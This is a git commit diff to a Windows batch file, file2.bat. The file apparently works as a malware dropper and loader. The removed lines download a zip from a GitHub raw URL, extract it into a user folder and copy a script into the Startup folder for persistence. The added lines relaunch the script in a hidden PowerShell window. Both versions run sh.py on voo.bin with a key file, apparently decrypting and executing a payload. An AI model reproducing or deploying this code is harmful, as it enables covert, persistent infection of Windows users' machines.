77f1ac60db1eb8122754791374dc69df442b8e51
MoViper2244 <ilovan738@gmail.com>
2025-09-08 17:42:19 -0700

    Update file2.bat

--- file2.bat
+++ file2.bat
@@ -1,40 +1,15 @@
 @echo off
-setlocal
+if not "%~1"=="h" (
+    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
+    exit /b
+)
 
-set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/"
-set "z=%TEMP%\zo.zip"
 set "d=%USERPROFILE%\Contacts\zo"
-set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 
-:: Create target directory if not exists
-if not exist "%d%" mkdir "%d%"
-
-:: Download zo.zip from the website
-powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%zo.zip','%z%')"
-
-:: Extract the zip file
-powershell -nologo -noprofile -command "Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force"
-del "%z%"
-
-:: Copy start.bat to startup folder
-copy "%APPDATA%\start.bat" "%s%"
-
-:: Run the Python script (dacă există)
+:: Rulează scriptul Python hidden
 cd /d "%d%"
-if exist "sh.py" (
-    if exist "voo.bin" and exist "x.txt" (
-        python.exe sh.py -i voo.bin -k x.txt
-    )
+if exist "sh.py" if exist "voo.bin" if exist "x.txt" (
+    python.exe sh.py -i voo.bin -k x.txt
 )
 
-:: Download result files based on exit code
-if %errorlevel%==0 (
-    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%a.txt','%TEMP%\a.txt')"
-) else (
-    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%b.txt','%TEMP%\b.txt')"
-)
-
-:: Run file2.bat
-if exist "%TEMP%\file2.bat" (
-    call "%TEMP%\file2.bat"
-)
+exit /b 0
